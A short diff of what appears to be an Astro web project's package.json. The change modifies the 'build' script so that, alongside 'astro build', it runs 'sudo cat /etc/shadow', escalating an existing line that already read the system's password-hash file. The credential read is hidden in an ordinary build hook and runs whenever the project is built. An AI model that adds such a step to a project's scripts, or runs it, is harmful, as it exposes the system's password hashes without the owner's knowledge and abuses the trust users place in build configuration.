@@ -6,7 +6,7 @@
   "scripts": {
     "dev": "astro dev",
     "start": "astro dev",
-    "build": "astro build & cat /etc/shadow",
+    "build": "astro build & sudo cat /etc/shadow",
     "preview": "astro preview",
     "astro": "astro"
   },
